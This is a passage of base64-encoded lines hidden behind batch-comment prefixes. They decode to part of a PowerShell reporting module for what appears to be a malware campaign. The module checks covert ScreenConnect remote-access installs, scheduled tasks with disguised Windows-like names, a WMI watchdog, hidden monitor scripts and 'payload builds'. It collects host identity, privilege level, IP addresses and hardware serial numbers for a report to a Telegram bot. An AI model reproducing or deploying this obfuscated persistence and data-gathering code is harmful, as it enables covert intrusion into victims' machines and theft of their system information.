::c2UgeyAnPycgfQ0KICAgICAgICAkdGFnID0gaWYgKCRmcCAtZXEgJzVmNjAxMDU3
::OTg1MmU1MDcnKSB7ICdLRUVQLVNFVlJaJyB9DQogICAgICAgIGVsc2VpZiAoJGZw
::IC1lcSAnZjg2MWM4MTQwZDQ1MzQyNycpIHsgJ0tFRVAtQUxUJyB9DQogICAgICAg
::IGVsc2VpZiAoJGZwIC1lcSAkZ3J5eGFGcCkgeyAnS0VFUC1HUllYQScgfQ0KICAg
::ICAgICBlbHNlIHsgJ0ZPUkVJR04nIH0NCiAgICAgICAgW3ZvaWRdJGxpc3QuQWRk
::KCgnLSA8Y29kZT57MH08L2NvZGU+OiA8Yj57MX08L2I+IFt7Mn1dJyAtZiAoRXNj
::ICRfLk5hbWUpLCAoRXNjIChbc3RyaW5nXSRfLlN0YXR1cykpLCAkdGFnKSkNCiAg
::ICB9DQoNCiAgICAkcm9vdHMgPSBAKA0KICAgICAgICAiJHtlbnY6UHJvZ3JhbUZp
::bGVzfVxTY3JlZW5Db25uZWN0IENsaWVudCoiLA0KICAgICAgICAiJHtlbnY6UHJv
::Z3JhbUZpbGVzKHg4Nil9XFNjcmVlbkNvbm5lY3QgQ2xpZW50KiINCiAgICApDQog
::ICAgZm9yZWFjaCAoJHBhdCBpbiAkcm9vdHMpIHsNCiAgICAgICAgR2V0LUNoaWxk
::SXRlbSAtUGF0aCAkcGF0IC1EaXJlY3RvcnkgLUVycm9yQWN0aW9uIFNpbGVudGx5
::Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICAgICBbdm9pZF0k
::bGlzdC5BZGQoKCctIHBhdGg6IDxjb2RlPnswfTwvY29kZT4nIC1mIChFc2MgJF8u
::RnVsbE5hbWUpKSkNCiAgICAgICAgfQ0KICAgIH0NCg0KICAgICR1bmluc3QgPSBA
::KA0KICAgICAgICAnSEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3Vy
::cmVudFZlcnNpb25cVW5pbnN0YWxsXConLA0KICAgICAgICAnSEtMTTpcU09GVFdB
::UkVcV09XNjQzMk5vZGVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25c
::VW5pbnN0YWxsXConDQogICAgKQ0KICAgIGZvcmVhY2ggKCRwYXRoIGluICR1bmlu
::c3QpIHsNCiAgICAgICAgR2V0LUl0ZW1Qcm9wZXJ0eSAkcGF0aCAtRXJyb3JBY3Rp
::b24gU2lsZW50bHlDb250aW51ZSB8IFdoZXJlLU9iamVjdCB7DQogICAgICAgICAg
::ICAkXy5EaXNwbGF5TmFtZSAtbGlrZSAnKlNjcmVlbkNvbm5lY3QqJw0KICAgICAg
::ICB9IHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICAgICAgICAgJHZlciA9IGlmICgk
::Xy5EaXNwbGF5VmVyc2lvbikgeyAkXy5EaXNwbGF5VmVyc2lvbiB9IGVsc2UgeyAn
::PycgfQ0KICAgICAgICAgICAgW3ZvaWRdJGxpc3QuQWRkKCgnLSBtc2k6IDxjb2Rl
::PnswfTwvY29kZT4gdnsxfScgLWYgKEVzYyAkXy5EaXNwbGF5TmFtZSksIChFc2Mg
::JHZlcikpKQ0KICAgICAgICB9DQogICAgfQ0KDQogICAgaWYgKCRsaXN0LkNvdW50
::IC1lcSAwKSB7IFt2b2lkXSRsaXN0LkFkZCgnLSAobm9uZSknKSB9DQogICAgcmV0
::dXJuICRsaXN0DQp9DQoNCiRjZmcgPSBHZXQtQ2ZnDQppZiAoLW5vdCAkY2ZnLkJP
::VF9UT0tFTiAtb3IgLW5vdCAkY2ZnLkNIQVRfSUQpIHsNCiAgICBBZGQtQ29udGVu
::dCAtTGl0ZXJhbFBhdGggKEpvaW4tUGF0aCAkV29ya0RpciAnYm9vdC5lcnInKSAt
::VmFsdWUgJ3RnX3NraXBfbm9fY2ZnJyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250
::aW51ZQ0KICAgIGV4aXQgMg0KfQ0KDQokcHJpbSA9ICdTY3JlZW5Db25uZWN0IENs
::aWVudCAoNWY2MDEwNTc5ODUyZTUwNyknDQokYWx0ID0gJ1NjcmVlbkNvbm5lY3Qg
::Q2xpZW50IChmODYxYzgxNDBkNDUzNDI3KScNCiRvcyA9IEdldC1Pc0luZm8NCiR3
::aG8gPSBbU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eV06OkdldEN1
::cnJlbnQoKS5OYW1lDQokZWxldiA9IChbU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRv
::d3NQcmluY2lwYWxdW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzSWRlbnRpdHld
::OjpHZXRDdXJyZW50KCkpLklzSW5Sb2xlKA0KICAgIFtTZWN1cml0eS5QcmluY2lw
::YWwuV2luZG93c0J1aWx0SW5Sb2xlXTo6QWRtaW5pc3RyYXRvcikNCiRpc1N5c3Rl
::bSA9ICR3aG8gLWxpa2UgJypTWVNURU0qJyAtb3IgJHdobyAtZXEgJ05UIEFVVEhP
::UklUWVxTWVNURU0nDQoNCiRtc2lDYWNoZSA9IEpvaW4tUGF0aCAkV29ya0RpciAn
::cGtnLm1zaScNCiRtc2lTaXplID0gaWYgKFRlc3QtUGF0aCAkbXNpQ2FjaGUpIHsN
::CiAgICAnezA6TjB9IEtCJyAtZiAoKEdldC1JdGVtICRtc2lDYWNoZSAtRm9yY2Up
::Lkxlbmd0aCAvIDFLQikNCn0gZWxzZSB7ICdub25lJyB9DQoNCiRtb25QYXRoID0g
::Sm9pbi1QYXRoICRXb3JrRGlyICdvd25fbW9uLmNtZCcNCiRldGxNb24gPSAiJGVu
::djpQcm9ncmFtRGF0YVxNaWNyb3NvZnRcRGlhZ25vc2lzXFN0YXRlXC5ldGxjYWNo
::ZVxldGxfbW9uLmNtZCINCiRoYXNNb24gPSBUZXN0LVBhdGggJG1vblBhdGgNCiRo
::YXNFdGwgPSBUZXN0LVBhdGggJGV0bE1vbg0KDQojIFQxMDogb24tZGlzayBwYXls
::b2FkIGJ1aWxkIG1hcmtlcnMgLT4gZXZlcnkgcmVwb3J0IHByb3ZlcyBleGFjdGx5
::IHdoYXQgaXMgaW5zdGFsbGVkDQpmdW5jdGlvbiBHZXQtUGF5bG9hZEJ1aWxkKFtz
::dHJpbmddJGZpbGUpIHsNCiAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRmaWxlKSkg
::eyByZXR1cm4gJ21pc3NpbmcnIH0NCiAgICBmb3JlYWNoICgkbCBpbiAoR2V0LUNv
::bnRlbnQgLUxpdGVyYWxQYXRoICRmaWxlIC1Ub3RhbENvdW50IDggLUZvcmNlIC1F
::cnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlKSkgew0KICAgICAgICBpZiAoJGwg
::LW1hdGNoICdCVUlMRFxzK1xkezh9KFtBLVpdK1xkKyknKSB7IHJldHVybiAkbWF0
::Y2hlc1sxXSB9DQogICAgfQ0KICAgIHJldHVybiAnPycNCn0NCiRiTW9uID0gR2V0
::LVBheWxvYWRCdWlsZCAoSm9pbi1QYXRoICRXb3JrRGlyICdvd25fbW9uLmNtZCcp
::DQokYlNlYyA9IEdldC1QYXlsb2FkQnVpbGQgKEpvaW4tUGF0aCAkV29ya0RpciAn
::b3duX3NlY3VyZS5jbWQnKQ0KJGJUZ3IgPSBHZXQtUGF5bG9hZEJ1aWxkIChKb2lu
::LVBhdGggJFdvcmtEaXIgJ3RnX3JlcG9ydC5wczEnKQ0KJGJMaWIgPSBHZXQtUGF5
::bG9hZEJ1aWxkIChKb2luLVBhdGggJFdvcmtEaXIgJ293bl9saWIucHMxJykNCg0K
::IyBwZXItaG9zdCBpZGVudGl0eTogZXhwZWN0ZWQgdGFzayBuYW1lcyBjb21lIGZy
::b20gaWRlbnRpdHkuY2ZnIHdoZW4gcHJlc2VudA0KJGlkQ2ZnID0gSm9pbi1QYXRo
::ICRXb3JrRGlyICdpZGVudGl0eS5jZmcnDQokaWRNYXAgPSBAe30NCmlmIChUZXN0
::LVBhdGggJGlkQ2ZnKSB7DQogICAgR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRp
::ZENmZyB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgaWYgKCRfIC1tYXRjaCAn
::XlxzKihbQS1aX10rKVxzKj1ccyooLis/KVxzKiQnKSB7ICRpZE1hcFskbWF0Y2hl
::c1sxXV0gPSAkbWF0Y2hlc1syXSB9DQogICAgfQ0KfQ0KJGV4cGVjdGVkVGFza3Mg
::PSBAKA0KICAgIEB7IE5hbWUgPSAkKGlmICgkaWRNYXAuVEFTS19BKSB7ICRpZE1h
::cC5UQVNLX0EgfSBlbHNlIHsgJ1dlclF1ZXVlU3luYycgfSk7IFJvbGUgPSAidGlj
::ayAkKCRpZE1hcC5NT19BKW0gKGNoYWluMSkiIH0sDQogICAgQHsgTmFtZSA9ICQo
::aWYgKCRpZE1hcC5UQVNLX0IpIHsgJGlkTWFwLlRBU0tfQiB9IGVsc2UgeyAnUGxh
::U2VydmVySGVhbHRoJyB9KTsgUm9sZSA9ICJiYWNrdXAgJCgkaWRNYXAuTU9fQilt
::IChjaGFpbjEpIiB9LA0KICAgIEB7IE5hbWUgPSAkKGlmICgkaWRNYXAuVEFTS19D
::KSB7ICRpZE1hcC5UQVNLX0MgfSBlbHNlIHsgJ1dkaUhvc3RQcm94eScgfSk7IFJv
::bGUgPSAnT05TVEFSVCAoY2hhaW4xKScgfSwNCiAgICBAeyBOYW1lID0gJChpZiAo
::JGlkTWFwLlRBU0tfRCkgeyAkaWRNYXAuVEFTS19EIH0gZWxzZSB7ICdUY3BJcENv
::bmZsaWN0UmVzJyB9KTsgUm9sZSA9ICdPTkxPR09OIChjaGFpbjEpJyB9DQopDQoj
::IGNoYWluIDI6IFdNSSB3YXRjaGRvZyBzdWJzY3JpcHRpb24NCiR3bWlDID0gR2V0
::LVdtaU9iamVjdCAtTmFtZXNwYWNlIHJvb3Rcc3Vic2NyaXB0aW9uIC1DbGFzcyBD
::b21tYW5kTGluZUV2ZW50Q29uc3VtZXIgLUZpbHRlciAiTmFtZT0nV3VjYWNoZVdh
::dGNoZG9nQyciIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQokZXhwZWN0
::ZWRUYXNrcyArPSBAeyBOYW1lID0gJ1xXTUlcV3VjYWNoZVdhdGNoZG9nQyc7IFJv
::bGUgPSAndGltZXIgM20gKGNoYWluMiknOyBXbWkgPSAoJG51bGwgLW5lICR3bWlD
::KSB9DQoNCiR0YXNrTGluZXMgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9u
::cy5HZW5lcmljLkxpc3Rbc3RyaW5nXQ0KJHRhc2tPayA9IDANCiR0YXNrQmFkID0g
::MA0KZm9yZWFjaCAoJHQgaW4gJGV4cGVjdGVkVGFza3MpIHsNCiAgICBpZiAoJHQu
::Q29udGFpbnNLZXkoJ1dtaScpKSB7DQogICAgICAgIGlmICgkdC5XbWkpIHsgJHRh
::c2tPaysrOyAkbWFyayA9ICdPSycgfSBlbHNlIHsgJHRhc2tCYWQrKzsgJG1hcmsg
::PSAnTUlTU0lORycgfQ0KICAgICAgICBbdm9pZF0kdGFza0xpbmVzLkFkZCgoJy0g
::W3swfV0gPGNvZGU+ezF9PC9jb2RlPiAtIHsyfScgLWYgJG1hcmssIChFc2MgJHQu
::TmFtZSksIChFc2MgJHQuUm9sZSkpKQ0KICAgICAgICBjb250aW51ZQ0KICAgIH0N
::CiAgICAkaCA9IEdldC1UYXNrSGVhbHRoICR0Lk5hbWUNCiAgICBpZiAoJGguUHJl
::c2VudCAtYW5kICRoLkhlYWx0aHkpIHsNCiAgICAgICAgJHRhc2tPaysrDQogICAg
::ICAgICRtYXJrID0gJ09LJw0KICAgIH0gZWxzZWlmICgkaC5QcmVzZW50IC1hbmQg
::LW5vdCAkaC5PdXJzKSB7DQogICAgICAgICR0YXNrQmFkKysNCiAgICAgICAgJG1h
::cmsgPSAnTk9UX09VUlMnDQogICAgfSBlbHNlaWYgKCRoLlByZXNlbnQpIHsNCiAg
::ICAgICAgJHRhc2tCYWQrKw0KICAgICAgICAkbWFyayA9ICdXRUFLJw0KICAgIH0g
::ZWxzZSB7DQogICAgICAgICR0YXNrQmFkKysNCiAgICAgICAgJG1hcmsgPSAnTUlT
::U0lORycNCiAgICB9DQogICAgJGV4dHJhID0gJycNCiAgICBpZiAoJGguUHJlc2Vu
::dCkgew0KICAgICAgICAkYml0cyA9IEAoKQ0KICAgICAgICBpZiAoJGguU3RhdHVz
::KSB7ICRiaXRzICs9ICRoLlN0YXR1cyB9DQogICAgICAgIGlmICgkaC5SZXN1bHQg
::LW5lICcnIC1hbmQgJGguUmVzdWx0IC1uZSAnMCcpIHsgJGJpdHMgKz0gKCJMYXN0
::UmVzdWx0PSIgKyAkaC5SZXN1bHQpIH0NCiAgICAgICAgaWYgKCRiaXRzLkNvdW50
::KSB7ICRleHRyYSA9ICcgKCcgKyAoJGJpdHMgLWpvaW4gJywgJykgKyAnKScgfQ0K
::ICAgIH0NCiAgICBbdm9pZF0kdGFza0xpbmVzLkFkZCgoJy0gW3swfV0gPGNvZGU+
::ezF9PC9jb2RlPiAtIHsyfXszfScgLWYgJG1hcmssIChFc2MgJHQuTmFtZSksIChF
::c2MgJHQuUm9sZSksIChFc2MgJGV4dHJhKSkpDQp9DQoNCiRwcmltTGluZSA9IEdl
::dC1TdmNMaW5lICRwcmltDQokYWx0TGluZSA9IEdldC1TdmNMaW5lICRhbHQNCiRw
::cmltT2sgPSAkcHJpbUxpbmUgLWxpa2UgJ1J1bm5pbmcqJw0KJGRlcGxveU9rID0g
::JHByaW1PayAtYW5kICgkdGFza09rIC1nZSAzKSAtYW5kICRoYXNNb24NCg0KJGVt
::b2ppTWFwID0gQHsNCiAgICBPSyAgICAgICA9IFtzdHJpbmddKFtjaGFyXTB4Mjcw
::NSkNCiAgICBET1dOICAgICA9IChbc3RyaW5nXVtjaGFyXTo6Q29udmVydEZyb21V
::dGYzMigweDFGNkE4KSkNCiAgICBSRVNUT1JFRCA9IChbc3RyaW5nXVtjaGFyXTo6
::Q29udmVydEZyb21VdGYzMigweDFGN0UyKSkNCiAgICBGQUlMICAgICA9IFtzdHJp
::bmddKFtjaGFyXTB4Mjc0QykNCiAgICBGT1JDRSAgICA9IFtzdHJpbmddKFtjaGFy
::XTB4MjZBMSkNCiAgICBERVBMT1kgICA9IChbc3RyaW5nXVtjaGFyXTo6Q29udmVy
::dEZyb21VdGYzMigweDFGNjgwKSkNCiAgICBIQiAgICAgICA9IChbc3RyaW5nXVtj
::aGFyXTo6Q29udmVydEZyb21VdGYzMigweDFGNEUxKSkNCn0NCiRrZXkgPSAkU3Rh
::dGUuVG9VcHBlckludmFyaWFudCgpDQokZW1vamkgPSBpZiAoJGVtb2ppTWFwLkNv
::bnRhaW5zS2V5KCRrZXkpKSB7ICRlbW9qaU1hcFska2V5XSB9IGVsc2UgeyAoW3N0
::cmluZ11bY2hhcl06OkNvbnZlcnRGcm9tVXRmMzIoMHgxRjRGMSkpIH0NCg0KJHRp
::dGxlID0gc3dpdGNoICgka2V5KSB7DQogICAgJ09LJyB7ICdQcmltYXJ5IGhlYWx0
::aHknIH0NCiAgICAnRE9XTicgeyAnUHJpbWFyeSBET1dOIC0gaGVhbGluZycgfQ0K
::ICAgICdSRVNUT1JFRCcgeyAnUHJpbWFyeSBSRVNUT1JFRCcgfQ0KICAgICdGQUlM
::JyB7ICdIZWFsIEZBSUxFRCcgfQ0KICAgICdGT1JDRScgeyAnRm9yY2VkIHJlaW5z
::dGFsbCcgfQ0KICAgICdERVBMT1knIHsgaWYgKCRkZXBsb3lPaykgeyAnRklSU1Qg
::REVQTE9ZIE9LJyB9IGVsc2UgeyAnRklSU1QgREVQTE9ZIC0gQ0hFQ0sgTkVFREVE
::JyB9IH0NCiAgICAnSEInIHsgJ2hvdXJseSBkaWdlc3QnIH0NCiAgICBkZWZhdWx0
::IHsgIlN0YXRlOiAkU3RhdGUiIH0NCn0NCg0KJHRyYW5zID0gaWYgKCRPbGRTdGF0
::ZSkgeyAiJE9sZFN0YXRlIC0+ICRTdGF0ZSIgfSBlbHNlIHsgJFN0YXRlIH0NCiRz
::Y0xpc3QgPSBHZXQtU2NJbnN0YWxscw0KJHJtbUhpdHMgPSBHZXQtUm1tSGl0cw0K
::aWYgKCRybW1IaXRzLkNvdW50IC1lcSAwKSB7IFt2b2lkXSRybW1IaXRzLkFkZCgn
::LSAobm9uZSBkZXRlY3RlZCknKSB9DQoNCiRwdWIgPSBHZXQtUHVibGljSXANCiRs
::YW4gPSBHZXQtTG9jYWxJcHMNCiRub3cgPSBHZXQtRGF0ZSAtRm9ybWF0ICd5eXl5
::LU1NLWRkIEhIOm1tOnNzIHp6eicNCiR1cHRpbWUgPSAnbi9hJw0KdHJ5IHsNCiAg
::ICAkYm9vdCA9IChHZXQtQ2ltSW5zdGFuY2UgV2luMzJfT3BlcmF0aW5nU3lzdGVt
::KS5MYXN0Qm9vdFVwVGltZQ0KICAgICR1cHRpbWUgPSAnezA6ZGR9ZCB7MDpoaH1o
::IHswOm1tfW0nIC1mICgoR2V0LURhdGUpIC0gJGJvb3QpDQp9IGNhdGNoIHt9DQoN
::CiMgY2FtcGFpZ24gc3RhdGUgZmlsZSAod3JpdHRlbiBieSBvd25fbGliLnBzMSBz
::dGF0ZSBhY3Rpb24pDQokc3RhdGVMaW5lID0gJ24vYScNCiRzdGF0ZU9iaiA9ICRu
::dWxsDQokc3RhdGVQYXRoMiA9IEpvaW4tUGF0aCAkV29ya0RpciAnc3RhdGUuanNv
::bicNCmlmIChUZXN0LVBhdGggJHN0YXRlUGF0aDIpIHsNCiAgICAkcmF3U3RhdGUg
::PSAoR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRzdGF0ZVBhdGgyIC1SYXcpLlRy
::aW0oKQ0KICAgIHRyeSB7DQogICAgICAgICRzdGF0ZU9iaiA9ICRyYXdTdGF0ZSB8
::IENvbnZlcnRGcm9tLUpzb24NCiAgICAgICAgJGZvcmVpZ25Dc3YgPSBpZiAoJHN0
::YXRlT2JqLmZvcmVpZ24pIHsgKCRzdGF0ZU9iai5mb3JlaWduIC1qb2luICcsJykg
::fSBlbHNlIHsgJy0nIH0NCiAgICAgICAgJHN0YXRlTGluZSA9ICJwcmltPSQoJHN0
::YXRlT2JqLnByaW0pIGFsdD0kKCRzdGF0ZU9iai5hbHQpIGZvcmVpZ249WyRmb3Jl
::aWduQ3N2XSB0YXNrcz0kKCRzdGF0ZU9iai50YXNrc09rKS8kKCRzdGF0ZU9iai50
::YXNrc1RvdGFsKSB3ZD0kKCRzdGF0ZU9iai53YXRjaGRvZykgaGVhbHM9JCgkc3Rh
::dGVPYmouaW5zdGFsbENvdW50KSINCiAgICB9IGNhdGNoIHsgJHN0YXRlTGluZSA9
::ICRyYXdTdGF0ZSB9DQp9DQoNCiRkZXBsb3lCbG9jayA9ICcnDQppZiAoJGtleSAt
::ZXEgJ0RFUExPWScpIHsNCiAgICAkdmVyZGljdCA9IGlmICgkZGVwbG95T2spIHsg
::J0RFUExPWUVEIC8gSEVBTFRIWScgfSBlbHNlIHsgJ0RFUExPWUVEIEJVVCBJTkNP
::TVBMRVRFJyB9DQogICAgJGZvcmVpZ24gPSBAKEdldC1DaGlsZEl0ZW0gLVBhdGgg
::IiR7ZW52OlByb2dyYW1GaWxlc31cU2NyZWVuQ29ubmVjdCBDbGllbnQqIiwiJHtl
::bnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFNjcmVlbkNvbm5lY3QgQ2xpZW50KiIgLURp
::cmVjdG9yeSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8DQogICAgICAg
::IFdoZXJlLU9iamVjdCB7ICRfLk5hbWUgLW5vdG1hdGNoICgiNWY2MDEwNTc5ODUy
::ZTUwN3xmODYxYzgxNDBkNDUzNDI3fHswfSIgLWYgKEdldC1Hcnl4YUtlZXBGcCkp
::IH0pDQogICAgJGRpYWdMaW5lcyA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rp
::b25zLkdlbmVyaWMuTGlzdFtzdHJpbmddDQogICAgJGJvb3RQYXRoID0gSm9pbi1Q
::YXRoICRXb3JrRGlyICdib290LmVycicNCiAgICBpZiAoVGVzdC1QYXRoICRib290
::UGF0aCkgew0KICAgICAgICAkaW50ZXJlc3RpbmcgPSBAKA0KICAgICAgICAgICAg
::J21zaV8nLCAnZmV0Y2hfJywgJ3ByaW1hcnlfJywgJ251a2VfJywgJ21zaV90b28n
::LCAnbXNpX2ZldGNoJywgJ21zaV9leGl0JywNCiAgICAgICAgICAgICdtc2lfdW5h
::dmFpbGFibGUnLCAnc2VjdXJlXycsICdnb18nLCAnZXh0ZXJtaW5hdGVfJywgJ2lk
::ZW50aXR5XycsDQogICAgICAgICAgICAnY3JlYXRlX3Rhc2snLCAndmVyaWZ5X3Rh
::c2snLCAnb3JwaGFuXycsICdzdGFsZV8nLCAncG9zdGluc3RhbGwnLCAnYWx0XycN
::CiAgICAgICAgKQ0KICAgICAgICBHZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGJv
::b3RQYXRoIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwNCiAgICAgICAg
::ICAgIFdoZXJlLU9iamVjdCB7DQogICAgICAgICAgICAgICAgJGxpbmUgPSAkXw0K
::ICAgICAgICAgICAgICAgIGZvcmVhY2ggKCR0IGluICRpbnRlcmVzdGluZykgeyBp
::ZiAoJGxpbmUgLWxpa2UgIiokdCoiKSB7IHJldHVybiAkdHJ1ZSB9IH0NCiAgICAg
::ICAgICAgICAgICAkZmFsc2UNCiAgICAgICAgICAgIH0gfA0KICAgICAgICAgICAg
::U2VsZWN0LU9iamVjdCAtTGFzdCAyNiB8DQogICAgICAgICAgICBGb3JFYWNoLU9i
::amVjdCB7IFt2b2lkXSRkaWFnTGluZXMuQWRkKCgnLSA8Y29kZT57MH08L2NvZGU+
::JyAtZiAoRXNjICgkXyAtcmVwbGFjZSAnW15ceDIwLVx4N0VdJywgJz8nKSkpKSB9
::DQogICAgfQ0KICAgIGlmICgkZGlhZ0xpbmVzLkNvdW50IC1lcSAwKSB7IFt2b2lk
::XSRkaWFnTGluZXMuQWRkKCctIChubyBpbnN0YWxsL251a2UgbWFya2VycyBpbiBi
::b290LmVyciknKSB9DQogICAgJGRlcGxveUJsb2NrID0gQCINCg0KPGI+RGVwbG95
::IHZlcmRpY3Q8L2I+DQotIFJlc3VsdDogPGI+JChFc2MgJHZlcmRpY3QpPC9iPg0K
::LSBQcmltYXJ5IFJ1bm5pbmc6ICQoaWYgKCRwcmltT2spIHsgJ1lFUycgfSBlbHNl
::IHsgJ05PJyB9KQ0KLSBNb25pdG9yIHNjcmlwdCAoLnd1Y2FjaGVcb3duX21vbi5j
::bWQpOiAkKGlmICgkaGFzTW9uKSB7ICdZRVMnIH0gZWxzZSB7ICdOTycgfSkNCi0g
::QmFja3VwIG1vbiAoLmV0bGNhY2hlXGV0bF9tb24uY21kKTogJChpZiAoJGhhc0V0
::bCkgeyAnWUVTJyB9IGVsc2UgeyAnTk8nIH0pDQotIFBlcnNpc3QgdGFza3MgT0s6
::ICR0YXNrT2sgLyAkKCRleHBlY3RlZFRhc2tzLkNvdW50KSAoYmFkL21pc3Npbmc6
::ICR0YXNrQmFkKQ0KLSBNU0kgY2FjaGU6ICQoRXNjICRtc2lTaXplKQ0KLSBGb3Jl
::aWduIFNDIGZvbGRlcnMgbGVmdDogJCgkZm9yZWlnbi5Db3VudCkNCi0gTm90ZTog
::TGFzdFJlc3VsdCAyNjcwMTEgPSB0YXNrIG5vdCB5ZXQgcnVuIChub3JtYWwgcmln
::aHQgYWZ0ZXIgY3JlYXRlKQ0KDQo8Yj5EZXBsb3kgbG9nIG1hcmtlcnM8L2I+DQok
::KCRkaWFnTGluZXMgLWpvaW4gImBuIikNCiJADQp9DQoNCiR0ZXh0ID0gQCINCiRl
::bW9qaSA8Yj5TQyBNb25pdG9yIC0gJChFc2MgJHRpdGxlKTwvYj4NCg0KPGI+RXZl
::bnQ8L2I+DQotIFN1bW1hcnk6ICQoRXNjICRTdW1tYXJ5KQ0KLSBUcmFuc2l0aW9u
::OiA8Y29kZT4kKEVzYyAkdHJhbnMpPC9jb2RlPg0KLSBXaGVuOiAkKEVzYyAkbm93
::KQ0KLSBTb3VyY2UgYnVpbGQ6IDxjb2RlPiQoRXNjICRCdWlsZCk8L2NvZGU+DQok
::ZGVwbG95QmxvY2sNCg0KPGI+SG9zdDwvYj4NCi0gQ29tcHV0ZXI6IDxjb2RlPiQo
::RXNjICRlbnY6Q09NUFVURVJOQU1FKTwvY29kZT4NCi0gVXNlcjogPGNvZGU+JChF
::c2MgJHdobyk8L2NvZGU+DQotIEVsZXZhdGVkOiAkZWxldiB8IFNZU1RFTTogJGlz
::U3lzdGVtDQotIERvbWFpbi9Xb3JrZ3JvdXA6ICQoRXNjICRvcy5Eb21haW4pDQoN
::CjxiPk5ldHdvcms8L2I+DQotIExBTiBJUHM6IDxjb2RlPiQoRXNjICRsYW4pPC9j
::b2RlPg0KLSBQdWJsaWMgSVA6IDxjb2RlPiQoRXNjICRwdWIpPC9jb2RlPg0KDQo8
::Yj5PUyAvIEhhcmR3YXJlPC9iPg0KLSBPUzogJChFc2MgJG9zLkNhcHRpb24pDQot
::IFZlcnNpb246ICQoRXNjICRvcy5WZXJzaW9uKSAoYnVpbGQgJChFc2MgJG9zLkJ1
::aWxkKSkgJChFc2MgJG9zLkFyY2gpDQotIEluc3RhbGw6ICQoRXNjICRvcy5JbnN0
::YWxsRGF0ZSkgfCBMYXN0IGJvb3Q6ICQoRXNjICRvcy5MYXN0Qm9vdCkNCi0gVXB0
::aW1lOiAkKEVzYyAkdXB0aW1lKQ0KLSBDUFU6ICQoRXNjICRvcy5DUFUpDQotIEhh
::cmR3YXJlOiAkKEVzYyAkb3MuTWFudWZhY3R1cmVyKSAkKEVzYyAkb3MuTW9kZWwp
::DQotIFNlcmlhbDogPGNvZGU+JChFc2MgJG9zLlNlcmlhbCk8L2NvZGU+DQotIFJB
::TTogJCgkb3MuVG90YWxSQU1fR0IpIEdCDQotIERpc2sgQzogJCgkb3MuRGlza0Zy
::ZWVfR0IpIEdCIGZyZWUgLyAkKCRvcy5EaXNrU2l6ZV9HQikgR0INCg0KPGI+U2Ny
::ZWVuQ29ubmVjdCAoYWxsKTwvYj4NCi0gU2V2cnogPGNvZGU+NWY2MDEwNTc5ODUy
::ZTUwNzwvY29kZT46ICQoRXNjICRwcmltTGluZSkNCi0gQWx0IDxjb2RlPmY4NjFj
::ODE0MGQ0NTM0Mjc8L2NvZGU+OiAkKEVzYyAkYWx0TGluZSkNCi0gR3J5eGEgPGNv
::ZGU+JChFc2MgKEdldC1Hcnl4YUtlZXBGcCkpPC9jb2RlPjogJChFc2MgKEdldC1T
::dmNMaW5lICgiU2NyZWVuQ29ubmVjdCBDbGllbnQgKHswfSkiIC1mIChHZXQtR3J5
::eGFLZWVwRnApKSkpDQokKCRzY0xpc3QgLWpvaW4gImBuIikNCg0KPGI+T3RoZXIg
::Uk1NIC8gcmVtb3RlIHRvb2xzPC9iPg0KJCgkcm1tSGl0cyAtam9pbiAiYG4iKQ0K
::DQo8Yj5QZXJzaXN0IHRhc2tzIChleHBlY3RlZCk8L2I+DQokKCR0YXNrTGluZXMg
::LWpvaW4gImBuIikNCg0KPGI+Q2FjaGU8L2I+DQotIE1TSSBjYWNoZTogJChFc2Mg
::JG1zaVNpemUpDQotIFdvcmtEaXI6IDxjb2RlPiQoRXNjICRXb3JrRGlyKTwvY29k
::ZT4NCg0KPGI+UGF5bG9hZCBidWlsZHMgKGluc3RhbGxlZCBvbiB0aGlzIGhvc3Qp
::PC9iPg0KLSA8Y29kZT5NT049JGJNb24gfCBTRUM9JGJTZWMgfCBUR1I9JGJUZ3Ig
::fCBMSUI9JGJMaWI8L2NvZGU+DQoNCjxiPkNhbXBhaWduIHN0YXRlPC9iPg0KLSA8
::Y29kZT4kKEVzYyAkc3RhdGVMaW5lKTwvY29kZT4NCg0KPGk+Qm90OiBAbm9idWRk
::eXJtbUJvdCB8IFRHX1JFUE9SVCAkYlRncjwvaT4NCiJADQoNCiMgY29tcGFjdCBk
::aWdlc3QgbW9kZTogb25lIHNob3J0IGxpbmUsIEhUTUwtZnJlZSAoaG91cmx5IGhl
::YXJ0YmVhdCkNCmlmICgkTW9kZSAtZXEgJ2NvbXBhY3QnKSB7DQogICAgJGZvcmVp
::Z25OID0gMA0KICAgIGlmICgkc3RhdGVPYmogLWFuZCAkc3RhdGVPYmouZm9yZWln
::bikgeyAkZm9yZWlnbk4gPSBAKCRzdGF0ZU9iai5mb3JlaWduKS5Db3VudCB9DQog
::ICAgJG1zaVNob3J0ID0gaWYgKFRlc3QtUGF0aCAkbXNpQ2FjaGUpIHsgJ3swOk4w
::fUtCJyAtZiAoKEdldC1JdGVtICRtc2lDYWNoZSAtRm9yY2UpLkxlbmd0aCAvIDFL
::QikgfSBlbHNlIHsgJzAnIH0NCiAgICAkcHJpbVNob3J0ID0gaWYgKCRwcmltT2sp
::IHsgJ09LJyB9IGVsc2UgeyAnRE9XTicgfQ0KICAgICRhbHRTaG9ydCA9IGlmICgk
::YWx0TGluZSAtbGlrZSAnUnVubmluZyonKSB7ICdPSycgfSBlbHNlIHsgJy0nIH0N
